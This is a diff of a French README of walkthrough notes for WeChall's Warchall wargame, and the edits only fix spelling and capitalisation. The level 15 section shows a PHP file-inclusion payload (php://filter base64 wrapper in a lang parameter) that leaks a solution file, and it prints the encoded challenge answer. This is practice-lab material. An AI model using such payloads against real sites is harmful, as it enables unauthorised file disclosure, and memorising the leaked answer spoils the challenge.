@@ -1,5 +1,5 @@
 # WeChall
-> loging into ssh to accees the warchall box
+> logging into ssh to accees the warchall box
 
 ## [ level 0 ] 
 - `cd /home/level/00_Welcome` : se diriger vers le dossier du niveau 0 .
@@ -77,19 +77,19 @@
 
 ## [ level 15 ] 
 - Nous allons cliquer sur le lien du challenge ***Right-Fi***
-- cliquez sur **EN** ou **DE** en haut a droite et l'URL changera comme tels :
+- Cliquez sur **EN** ou **DE** en haut a droite et l'URL changera comme tels :
   ```
   https://rfi.warchall.net/index.php?lang=en
-- rajoutons des elements sur l'url comme ci-dessous :
+- Rajoutons des éléments sur l'url comme ci-dessous :
   ```
   https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php
 
- - la page d'acceuil s'affichera mais il y a un long message et des messages de ***Warning*** qui sont ajoutées .
- - nous allons ensuite copier le texte incomprehensible et le decoder avec les commandes suivantes :
+ - La page d'acceuil s'affichera mais il y a un long message et des messages de ***Warning*** qui sont ajoutées .
+ - Nous allons ensuite copier le texte incomprehensible et le decoder avec les commandes suivantes :
  - `echo " ` :
    ```
    PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K
 
- - `" | base64 -d -i ` : et le mot de passe se trouvera ensuite tout en bas a gauche  .
+ - `" | base64 -d -i ` : et le mot de passe s'affichera ensuite tout en bas a gauche  .
 
 
